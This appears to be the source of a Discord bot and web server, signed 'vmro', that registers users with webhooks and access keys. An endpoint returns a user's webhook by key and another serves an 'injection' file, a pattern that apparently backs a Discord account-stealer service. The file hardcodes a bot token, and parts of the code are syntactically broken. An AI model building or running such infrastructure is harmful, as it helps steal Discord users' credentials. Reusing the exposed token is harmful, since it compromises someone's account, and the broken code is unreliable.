var prefix = "-";
var LostHook = "vmro"
import discord, { Client, Intents } from "discord.js";
const client = new Client({
  intents: [Intents.FLAGS.GUILDS, Intents.FLAGS.GUILD_MESSAGES],
});
import { sha256 } from "crypto-hash";
import jsoning from "jsoning";
const database = new jsoning("database.json");
import express from "express";
import path from "path";
import cors from "cors";
import { fileURLToPath } from "url";
const filename = fileURLToPath(import.meta.url);
const dirname = path.dirname(filename);
const app = express();

client.on("ready", () => {
  console.log("Logged in vmro lol, My name is " + client.user.tag);
});

client.on("messageCreate", async (message) => {
  if (!message.content.startsWith(prefix)) return;
  const args = message.content.slice(prefix.length).trim().split(" ");
  const command = args.shift().toLocaleLowerCase();

  if (command == "ts") {
    var status = await database.get("status");
    if (!message.member.permissions.has("ADMINISTRATOR")) return;
    status = !status;
    await database.set("status", status);
    message.channel.send(
      status ? "Set status to Operational" : "Set status to Down"
    );
  }

  if (command == "status") {
    var status = await database.get("status");
    message.channel.send({
      embeds: [
        new discord.MessageEmbed()
          .setTitle("UnrealFa Status")
          .setColor(status ? "GREEN" : "RED")
          .setDescription(
            status ? "All Systems are Operational" : "Servers Are Down"
          )
          .setFooter("UnrealFa")
          .setTimestamp(),
      ],
    });
  }
  if (command == "insane") {
    message.channel.send("WOW INSANE CODING SKILLS VMRO");
  }

  if (command == "register") {
    if (!message.member.permissions.has("ADMINISTRATOR")) return;
    if (!args) return;
    if (!args[1]) return;
    var user = message.mentions.users.first();
    var webhook = args[1];
    if (!webhook.startsWith("https://discord.com/%22)) return;
    await message.delete();
    var key = await sha256(user.id + webhook);

    var check = await database.get(key);
    if (check) {
      return message.channel.send("User Already Registered");
    }

    await database.set(key, { user: user.id, webhook });

    message.channel.send({
      embeds: [
        new discord.MessageEmbed()
          .setTitle("User Registered")
          .setColor("PURPLE")
          .setDescription(<@${user.id}> has Been successfully Registered!)
          .addField("Access Key", "\n" + key + "\n")
          .addField(
            "Webhook Url",
            "\n" +
            webhook.replace(
              webhook.substring(30, 60),
              "[ Webhook Censored Vmro ]"
            ) +
            "\n
            "
          ),
      ],
    });
  }

  if (command == "revoke") {
    if (!message.member.permissions.has("ADMINISTRATOR")) return;
    if (!args) return;
    var user = message.mentions.users.first();
    if (!user) return;
    try {
      await database.delete(user.id);
      message.channel.send("Revoked Access of: " + "<@" + user.id + ">");
    } catch {
      message.channel.send("Unexpected error");
    }
  }
});
app.get("/getdafuckinghook/:auth", async (req, res) => {
  try {
    var hook = await database.get(req.params.auth);
    hook = hook.webhook;
    res.set('content-type', 'text/plain')
    res.send(hook);
  } catch {
    res.send(LostHook);
  }
});
app.get("/injection", async (req, res) => {
  await res.sendFile("inj.txt", { root: dirname }, (err) => {
     return;
  });
});
app.listen(80);

client.login("OTMzNzQ1MzY1NTMyOTU0Njc0.YemAIw.1wJyNfc7b_gmVmaUe87wrjHLhBo");